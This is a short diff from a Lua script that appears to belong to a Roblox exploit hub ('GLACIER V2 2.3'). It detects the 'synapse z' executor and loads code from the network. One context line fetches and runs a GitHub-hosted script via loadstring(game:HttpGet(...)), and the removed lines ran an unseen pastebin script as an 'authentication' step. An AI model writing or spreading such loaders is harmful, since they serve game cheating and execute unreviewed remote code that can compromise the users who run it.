@@ -20,9 +20,3 @@ if string.find(string.lower(tostring(identifyexecutor())), "synapse z") then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/liam0999/Drawing2/refs/heads/main/Drawing2.lua"))();
 end
 notifyfunction("< GLACIERⱽ² 2.3 >", "Detected version/game: " .. shared.version)
-local succ, err = pcall(function()
-      loadstring(game:HttpGet("https://pastebin.com/raw/aWxvycXc"))()
-   end)
-if succ then 
-print("Authentication Success!")
-end   
